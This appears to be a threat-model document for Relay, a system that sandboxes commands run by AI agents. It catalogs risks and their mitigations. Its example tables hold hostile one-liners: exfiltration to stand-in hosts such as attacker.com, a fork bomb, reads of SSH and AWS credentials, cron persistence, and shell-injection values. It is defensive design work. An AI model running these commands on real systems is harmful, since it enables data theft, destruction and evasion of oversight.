# Risk Categories

This document catalogs risks from agentic command/code execution and Relay's mitigation strategies.

---

# Part 1: Local Execution Risks

Risks from running commands/code on the Relay host.

---

## 1. Resource Exhaustion (Local)

Agents consuming unbounded local resources.

| Risk | Example |
|------|---------|
| CPU spin | `while true; do :; done` |
| Memory bomb | `python -c "x = 'a' * 10**12"` |
| Disk fill | `dd if=/dev/zero of=bigfile bs=1G count=100` |
| PID exhaustion | Fork bomb `:(){ :|:& };:` |
| File descriptor leak | Open 1M files |

**Mitigations:**
- cgroups v2 (CPU, memory, PIDs limits)
- Disk quotas per sandbox
- ulimits (nofile, nproc)
- Execution timeouts

**Status:** ⚠️ Planned — see `sandbox-isolation.md`

---

## 2. Network Abuse (Outbound)

Unauthorized or harmful network activity.

| Risk | Example |
|------|---------|
| Data exfiltration | `curl attacker.com -d @/etc/passwd` |
| Internal scanning | `nmap 10.0.0.0/8` |
| Cloud metadata access | `curl 169.254.169.254` |
| API hammering / DDoS | Flood external services |

**Mitigations:**
- Proxy mode for HTTP(S) — rate limiting, blocklists
- Network namespace isolation
- Firewall rules (iptables/nftables) for non-HTTP
- Block cloud metadata IPs by default

**Status:** ✅ HTTP covered by proxy mode. ❌ Non-HTTP egress is a gap.

---

## 3. Filesystem Escape

Accessing or modifying files outside the sandbox.

| Risk | Example |
|------|---------|
| Read sensitive files | `cat ~/.ssh/id_rsa` |
| Write outside sandbox | `echo "pwned" > /etc/cron.d/evil` |
| Symlink escape | `ln -s /etc/passwd ./safe && cat safe` |
| Hardlink abuse | Link to sensitive file, modify via link |
| Path traversal | `cat ../../../etc/shadow` |

**Mitigations:**
- chroot or pivot_root into sandbox directory
- Overlay filesystem (changes don't persist to host)
- Mount namespace isolation
- Symlink resolution checks before access
- Block hardlink creation to outside files

**Status:** ❌ Needs `filesystem-isolation.md`

---

## 4. Privilege Escalation

Gaining elevated permissions.

| Risk | Example |
|------|---------|
| Setuid binaries | `sudo`, `pkexec`, `su` |
| Capability abuse | `CAP_NET_ADMIN`, `CAP_SYS_ADMIN` |
| Container escape | Exploit namespace/cgroup bugs |
| Kernel exploits | Malicious syscalls |

**Mitigations:**
- Drop all capabilities
- No setuid/setgid binaries in sandbox
- User namespace (run as unprivileged user)
- Seccomp syscall filtering
- Minimal attack surface (limited binaries)

**Status:** ❌ Needs `sandbox-isolation.md`

---

## 5. Persistence / Scheduling Abuse

Establishing persistent access outside the session.

| Risk | Example |
|------|---------|
| Cron jobs | `echo "* * * * * evil" \| crontab -` |
| At jobs | `at now + 1 minute <<< "curl evil.com"` |
| Systemd timers | Create user timer unit |
| Shell rc files | `echo "evil" >> ~/.bashrc` |

**Mitigations:**
- No access to cron/at/systemd paths
- Isolated home directory (not real `~`)
- Read-only bind mounts for system paths
- Session state doesn't persist to host

**Status:** ⚠️ Implicit in sandbox design — needs explicit rules

---

## 6. State Pollution

Corrupting state that affects future commands or sessions.

| Risk | Example |
|------|---------|
| Env var injection | Set `LD_PRELOAD`, `PATH` for next command |
| Shell rc modification | Trojan `.bashrc`, `.zshrc` |
| Git config tampering | `git config --global core.pager "evil"` |
| SSH config | `ProxyCommand` in `~/.ssh/config` |
| Package manager | `pip install evil --user` |

**Mitigations:**
- Fresh environment per command (no inheritance)
- Isolated home directory per session
- Explicit allowlist for env vars
- Reset state between sessions

**Status:** ⚠️ Needs `session-isolation.md`

---

## 7. Secrets Exposure

Leaking credentials or sensitive data.

| Risk | Example |
|------|---------|
| Env var leaks | `env \| grep SECRET` |
| Credential files | `cat ~/.aws/credentials` |
| Process snooping | `/proc/*/environ`, `/proc/*/cmdline` |
| Clipboard access | `xclip -o`, `pbpaste` |
| Command history | `cat ~/.bash_history` |

**Mitigations:**
- Env var blocklist (strip secrets before exec)
- Isolated home directory (no real credentials)
- Restrict `/proc` access (hidepid, masked paths)
- No clipboard access in sandbox

**Status:** ⚠️ Env blocklist exists. File/proc access needs work.

---

## 8. Command Injection / Shell Escape

Malicious input breaking out of intended command structure.

| Risk | Example |
|------|---------|
| Metacharacter injection | `file.txt; rm -rf /` |
| Backtick expansion | `` `whoami` `` |
| Variable expansion | `$HOME`, `${PATH}` |
| Glob expansion | `rm *` matches unintended files |
| Quote escape | `"$(evil)"` |

**Mitigations:**
- Direct exec (no `sh -c` wrapper)
- Parse commands into argv before execution
- No shell interpolation by Relay
- Strict input validation in policy layer

**Status:** ❌ Needs `execution-model.md`

---

## 9. Denial of Observability

Attacks that break logging, monitoring, or output handling.

| Risk | Example |
|------|---------|
| Log flooding | Print 10GB to stdout |
| Binary output | Break JSON log parsers |
| ANSI escape injection | Terminal control sequences |
| Stderr spam | Flood error stream |
| Output encoding tricks | Invalid UTF-8 |

**Mitigations:**
- Output size limits (truncate with warning)
- Separate handling for binary vs text
- ANSI escape stripping/sanitization
- Per-stream limits (stdout, stderr)
- Graceful handling of invalid encoding

**Status:** ⚠️ Mentioned — needs formalization

---

## 10. Concurrency / Race Conditions

Timing-based vulnerabilities from parallel execution.

| Risk | Example |
|------|---------|
| TOCTOU | Check file exists, then read — swapped between |
| Parallel write conflicts | Two commands write same file |
| Session state races | Concurrent command modifications |
| Resource contention | Deadlocks, livelocks |

**Mitigations:**
- Optional serialized execution mode
- File locking for shared resources
- Atomic operations where possible
- Per-session working directories

**Status:** ❌ Not yet addressed

---

# Part 2: External System Risks

Risks when agents access production systems (databases, cloud APIs, clusters) — even with read-only access.

**Key insight:** Read-only ≠ safe. Agents can still exfiltrate data, cause brownouts, incur costs, and leak sensitive information.

---

## 11. Data Exfiltration

Bulk reading data and transferring it externally.

| Risk | Example |
|------|---------|
| Database dump | `aws dynamodb scan --table-name users > dump.json` |
| Search export | `curl "opensearch:9200/_search?size=10000"` |
| S3 sync | `aws s3 sync s3://customer-data ./local` |
| Upload to attacker | `curl -X POST attacker.com -d @dump.json` |

**Mitigations:**
- Query result size limits (max rows/bytes)
- Outbound payload size monitoring
- Block bulk export operations (`scan`, `sync`)
- Exfiltration detection (large POST to unknown hosts)
- Response truncation in proxy

**Status:** ⚠️ Proxy can limit outbound. Query-level limits not implemented.

---

## 12. Cost Attacks

Triggering expensive operations that inflate cloud bills.

| Risk | Example |
|------|---------|
| Full table scan | `aws dynamodb scan --table-name massive_table` |
| Heavy aggregations | OpenSearch `aggs` on millions of docs |
| Bandwidth abuse | Download TBs from S3 |
| Cross-region transfer | Copy data between regions |

**Mitigations:**
- Query cost estimation before execution
- Read capacity unit budgets (DynamoDB)
- Bandwidth limits per session
- Block `scan` operations; enforce `query` with key conditions
- Operation-level allowlists

**Status:** ❌ Not implemented. Needs query inspection layer.

---

## 13. Target Resource Starvation

Overwhelming production systems with read-heavy load.

| Risk | Example |
|------|---------|
| Parallel queries | 100 concurrent OpenSearch requests |
| IOPS saturation | Repeated DynamoDB reads exhaust capacity |
| Connection pool exhaustion | Too many DB connections |
| Memory pressure | Large result sets on target |

**Mitigations:**
- Per-target RPS limits (proxy mode ✅)
- Per-target concurrency caps
- Circuit breakers on latency/error rate (proxy mode ✅)
- Query complexity scoring (reject expensive patterns)

**Status:** ✅ Proxy mode addresses this for HTTP targets.

---

## 14. Metadata / Schema Exposure

Revealing system architecture through discovery operations.

| Risk | Example |
|------|---------|
| List tables | `aws dynamodb list-tables` |
| Index enumeration | `curl "opensearch:9200/_cat/indices"` |
| Schema discovery | `curl "opensearch:9200/_mapping"` |
| Namespace listing | `kubectl get namespaces` |
| Account enumeration | `aws sts get-caller-identity` |

**Mitigations:**
- Block list/describe operations on sensitive resources
- Scoped credentials (no `list-*` permissions)
- Audit logging of metadata access
- Allowlist specific resources (no discovery)

**Status:** ❌ Needs policy-level operation filtering.

---

## 15. Sensitive Data Discovery

Finding secrets, PII, or credentials in queryable data.

| Risk | Example |
|------|---------|
| Log mining | `curl "opensearch:9200/logs-*/_search" -d '{"query":{"match":{"message":"password"}}}'` |
| Config scanning | `aws dynamodb scan --filter "contains(key, 'secret')"` |
| Error message exposure | Stack traces with credentials |
| Audit trail secrets | API keys in access logs |

**Mitigations:**
- Query content filtering (block `password`, `secret`, `token` patterns)
- Response redaction (mask PII, credentials)
- Field-level access policies
- Separate sensitive data into inaccessible stores

**Status:** ❌ Needs response inspection and redaction layer.

---

## 16. Cross-Tenant Data Leakage

Accessing data belonging to other tenants in multi-tenant systems.

| Risk | Example |
|------|---------|
| Missing tenant filter | `curl "opensearch:9200/orders/_search" -d '{"query":{"match_all":{}}}'` |
| Tenant ID guessing | Iterate through tenant IDs |
| Shared index access | Query index containing multiple tenants |

**Mitigations:**
- Mandatory query rewriting (inject tenant filter)
- Row-level security at database layer
- Scoped credentials per tenant
- Validate tenant context in every query

**Status:** ❌ Requires query rewriting capability.

---

## 17. Audit Pollution

Flooding logs to hide malicious activity or degrade monitoring.

| Risk | Example |
|------|---------|
| Query flooding | 10,000 innocent queries to bury one malicious |
| Log injection | Craft queries that create misleading log entries |
| Alert fatigue | Trigger many false positives |

**Mitigations:**
- Rate limiting (proxy mode ✅)
- Anomaly detection on query patterns
- Immutable audit logs with integrity checks
- Separate agent audit trail

**Status:** ⚠️ Rate limiting helps. Anomaly detection not implemented.

---

## 18. Timing / Side-Channel Attacks

Inferring information from response timing or error differences.

| Risk | Example |
|------|---------|
| Existence probing | 404 in 5ms vs 403 in 50ms reveals existence |
| Permission mapping | Different errors for "not found" vs "forbidden" |
| Timing-based enumeration | Measure response time to infer data |

**Mitigations:**
- Constant-time responses (hard to implement)
- Generic error messages (no existence vs permission distinction)
- Rate limiting to slow enumeration

**Status:** ❌ Mostly out of scope for Relay. Document as limitation.

---

## 19. Backup / Snapshot Access

Accessing backups which may have weaker controls than live data.

| Risk | Example |
|------|---------|
| List backups | `aws dynamodb list-backups` |
| S3 backup buckets | `aws s3 ls s3://backups/` |
| OpenSearch snapshots | `curl "opensearch:9200/_snapshot/_all"` |
| RDS snapshots | `aws rds describe-db-snapshots` |

**Mitigations:**
- No access to backup APIs/buckets
- Separate IAM policies for backup vs live
- Backup encryption with different keys
- Block snapshot/backup operations in policy

**Status:** ❌ Needs operation-level blocklist.

---

## 20. Query Injection

Malformed queries exploiting parsing or evaluation.

| Risk | Example |
|------|---------|
| OpenSearch injection | `{"query":{"match":{"user":"* OR 1=1"}}}` |
| DynamoDB expression injection | User input in filter expressions |
| NoSQL injection | Operator injection in MongoDB-style queries |

**Mitigations:**
- Parameterized queries only
- Query validation before execution
- No raw query strings from untrusted input
- Escape/sanitize user-provided values

**Status:** ❌ Needs query inspection layer.

---

## 21. Permission / Capability Enumeration

Agent discovering its own permissions to find gaps or escalation paths.

| Risk | Example |
|------|---------|
| IAM introspection | `aws iam get-user` |
| Policy listing | `aws iam list-attached-user-policies` |
| Permission simulation | `aws iam simulate-principal-policy` |
| Role enumeration | `aws sts get-caller-identity` |

**Mitigations:**
- Block IAM introspection APIs
- Minimal credentials (no IAM read permissions)
- Audit IAM-related API calls
- Least-privilege credential scoping

**Status:** ❌ Needs AWS-aware policy rules.

---

# Coverage Matrix

## Local Execution Risks

| Category | Proxy | cgroups | Namespace | Seccomp | Policy | Needs Doc |
|----------|-------|---------|-----------|---------|--------|-----------|
| Resource exhaustion | | ✅ | | | | sandbox-isolation |
| Network (HTTP) | ✅ | | | | | — |
| Network (non-HTTP) | | | ✅ | | | network-isolation |
| Filesystem escape | | | ✅ | ✅ | | filesystem-isolation |
| Privilege escalation | | | ✅ | ✅ | | sandbox-isolation |
| Persistence | | | ✅ | | ✅ | — |
| State pollution | | | | | ✅ | session-isolation |
| Secrets exposure | | | | | ✅ | — |
| Command injection | | | | | | execution-model |
| Observability attacks | | | | | | output-handling |
| Concurrency | | | | | | concurrency |

## External System Risks

| Category | Proxy | Query Inspect | Response Filter | Policy | Needs Doc |
|----------|-------|---------------|-----------------|--------|-----------|
| Data exfiltration | ✅ | ✅ | ✅ | ✅ | data-access |
| Cost attacks | | ✅ | | ✅ | data-access |
| Target starvation | ✅ | | | | — |
| Metadata exposure | | | | ✅ | data-access |
| Sensitive data discovery | | ✅ | ✅ | | data-access |
| Cross-tenant leakage | | ✅ | | | data-access |
| Audit pollution | ✅ | | | | — |
| Timing side-channels | | | | | — (limitation) |
| Backup access | | | | ✅ | data-access |
| Query injection | | ✅ | | | data-access |
| Permission enumeration | | | | ✅ | data-access |

---

# Relay Depth Levels

How deep does Relay inspect?

| Level | What Relay Sees | Complexity | Coverage |
|-------|-----------------|------------|----------|
| **Command** | `curl`, `aws`, `kubectl` | Low | Basic |
| **Args** | `--table-name users` | Medium | Good |
| **Request body** | JSON query payload | High | Strong |
| **Response body** | Returned data | Very High | Full |
| **Semantic** | "This is a full table scan" | Extreme | Complete |

MVP: Command + Args + Proxy (HTTP level)
Future: Request/response inspection for sensitive targets

---

# Priority Order for Implementation

## Phase 1: Local Execution Safety
1. **Execution model** — foundational; prevents injection
2. **Sandbox isolation** — cgroups, namespaces, seccomp
3. **Filesystem isolation** — chroot, overlay, symlink handling
4. **Session isolation** — state management, env handling

## Phase 2: Network & External Safety
5. **Network isolation (non-HTTP)** — firewall, namespace
6. **Proxy hardening** — circuit breakers, blocklists
7. **Output handling** — limits, sanitization

## Phase 3: Data Access Safety
8. **Query inspection** — parse and validate queries
9. **Response filtering** — redaction, size limits
10. **Operation policies** — AWS/OpenSearch-aware rules
11. **Cost controls** — budget limits, expensive op blocking

## Phase 4: Advanced
12. **Concurrency** — locking, serialization options
13. **Anomaly detection** — unusual patterns
14. **Adaptive limits** — dynamic rate adjustment
